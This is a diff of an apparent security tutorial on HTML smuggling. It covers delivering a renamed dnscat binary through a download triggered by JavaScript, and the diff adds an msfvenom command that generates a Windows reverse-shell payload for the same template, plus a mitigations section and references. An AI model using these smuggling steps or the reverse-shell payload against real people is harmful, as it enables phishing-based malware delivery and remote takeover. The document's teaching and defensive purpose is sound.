@@ -70,7 +70,7 @@ One way that we can get a user to download something is using the download attri
 If we load that page we should see the Microsoft Login Page! text and it should prompt for download of s.dll when you click "login to continue". You can see how it can be crafted in whatever way you want, but all that’s being emailed is the HTML that does this. Additionally, the victim may have their browser at default settings which wouldn’t give this prompt but just download it. 
 
 ## Malicious Smuggle Test
-Now that we have seen benign usage of some ways to do HTML Smuggling, lets try with an actual binary. For this I am using a renamed version of dnscat because I know Defender blocks it as malicious. The dnscat executable I have renamed to leroy3.exe. 
+Now that we have seen benign usage of some ways to do HTML Smuggling, lets try with an actual binary. For this I am using a renamed version of dnscat because I know Defender blocks it as malicious. The dnscat executable I have renamed to leroy3.exe. My test is based off of examples found [here](https://www.hackingarticles.in/a-detailed-guide-on-html-smuggling/)
 
 ![](smuggle1.png)
 
@@ -140,4 +140,28 @@ We do see code above indicating it is indeed dnscat. Lets break down what the co
 7.	createObjectURL(): A DOM function that can return a DOMString containing a value that represents the URL of an object. This object can be a file, media source or in our case blob. It is very necessary as the a.download works on valid URLs only. For our payload blob to be downloaded on the victim, we need to supply the a.download element with a valid URL which this function returns.
 8.	click(): Is what will trigger this anchor tag to automatically run. It simulates as if a user has actually clicked on the link provided by the href tag.
 
+You can also fir up Kali and try this with an msfvenom created payload
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.129.132 LPORT=1234 -f exe > payload.exe
+```
+Base64 encode this on base64.guru and try the same template. 
+
+## Mitigations
+- Configure security products to block against pages using JS or VBScript from automatically running a downloaded executable. Windows Attack Surface Reduction Rules are handy for this https://learn.microsoft.com/en-us/mem/intune/protect/endpoint-security-asr-profile-settings  - Specifically the following rules:
+	- Block execution of potentially obfuscated scripts (js/vbs/ps)
+	- Block JavaScript or VBScript from launching downloaded executable content
+- Whitelist executable filenames
+- Set .js and .jse to open with notepad by default and not a browser
+- Educate users to manually review e-mail attachments
+- Set behaviour rules for HTML pages that decode base64 code or obfuscate a JS script.
+- Microsoft’s Safe Links and Safe Attachments provide real-time protection against HTML smuggling and other email threats by utilizing a virtual environment to check links and attachments in email messages before they are delivered to recipients. Thousands of suspicious behavioral attributes are detected and analyzed in emails to determine a phishing attempt
+
+## References
+![](https://blog.delivr.to/html-smuggling-recent-observations-of-threat-actor-techniques-74501d5c8a06) \
+![](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/) \
+![](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/offensive-security/defense-evasion/file-smuggling-with-html-and-javascript.md) \ 
+![](https://www.cyfirma.com/outofband/html-smuggling-a-stealthier-approach-to-deliver-malware/) \
+![](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/html-smuggling-the-hidden-threat-in-your-inbox/) \
+![](https://micahbabinski.medium.com/html-smuggling-detection-5adefebb6841) \
+![](https://www.hackingarticles.in/a-detailed-guide-on-html-smuggling/) \
 
